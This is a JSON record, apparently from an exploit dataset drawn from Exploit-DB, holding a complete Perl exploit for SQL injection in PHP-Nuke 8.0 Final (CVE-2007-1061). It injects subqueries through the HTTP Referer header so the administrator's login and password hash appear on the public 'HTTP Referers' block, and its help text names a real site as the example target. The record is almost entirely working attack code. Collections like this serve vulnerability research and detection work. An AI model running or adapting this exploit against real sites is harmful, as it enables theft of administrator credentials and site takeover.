{
  "id": "3346",
  "title": "PHP-Nuke 8.0 Final - HTTP Referers SQL Injection",
  "cve": "CVE-2007-1061",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl \r\n#0day exploit for PHP-nuke <=8.0 Final\r\n#Sql injection attack in INSERT syntax\r\n#version, when 'HTTP Referers' block is on\r\n#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]\r\n#Screenshot:\r\n#0day exploit for PHP-nuke <=8.0 Final\r\n#Sql injection attack in INSERT syntax\r\n#version, when 'HTTP Referers' block is on\r\n#Coded by:Maciej `krasza` Kukla[krasza@gmail.com]\r\n#\r\n#[+]You can see login and hash on web page in 'HTTP referers' block\r\n#[+]Exploit successed\r\nuse strict;\r\nuse warnings;\r\nuse LWP;\r\nmy $adres=shift or help();\r\nmy $ua = LWP::UserAgent->new;\r\nmy $zadanie = HTTP::Request->new(GET => $adres);\r\nmy ($respone,$referer);\r\nbanner();\r\n\t$referer=\"http://www.krasza.int.pl'),(NULL,(SELECT `pwd` FROM `nuke_authors` WHERE `radminsuper`=1))/*\";\r\n\t$zadanie->referer($referer);\r\n\t$respone=$ua->request($zadanie);\r\n\t$respone->is_success or die \"$adres : \",$respone->message,\"\\n\";\r\n        $referer=\"http://www.krasza.int.pl'),(NULL,(SELECT `aid` FROM `nuke_authors` WHERE `radminsuper`=1))/*\";\r\n\t$zadanie->referer($referer);\r\n\t$respone=$ua->request($zadanie);\r\n        $respone->is_success or die \"$adres : \",$respone->message,\"\\n\";\r\n\tprint \"[+]You can see login and hash on web page in 'HTTP referers' block\\n\";\r\n\tprint \"[+]Exploit successed\\n\";\r\nsub banner{\r\n\tprint \"0day exploit for PHP-nuke <=8.0 Final\\n\";\r\n        print \"Sql injection attack in INSERT syntax\\n\";\r\n\tprint \"version, when 'HTTP Referers' block is on\\n\";\r\n        print \"Coded by:Maciej `krasza` Kukla[krasza\\@gmail.com]\\n\\n\";\r\n}\r\nsub help{\r\n\tprint \"0day exploit for PHP-nuke <=8.0 Final\\n\";\r\n\tprint \"Sql injection attack in INSERT syntax\\n\";\r\n\tprint \"version, when 'HTTP Referers' block is on\\n\";\r\n\tprint \"Coded by:Maciej `krasza` Kukla[krasza\\@gmail.com]\\n\";\r\n\tprint \"Use:\\n\";\r\n\tprint \"\\tperl exploit.pl [url]\\n\";\r\n\tprint \"\\t[url]-vicitim webpage with index.php\\n\";\r\n\tprint \"Example:\\n\";\r\n\tprint \"\\tperl exploit.pl http://phpnuke.org/index.php\\n\";\r\n\texit(0);\r\n}\r\n\r\n# milw0rm.com [2007-02-20]",
  "url": "https://www.exploit-db.com/exploits/3346"
}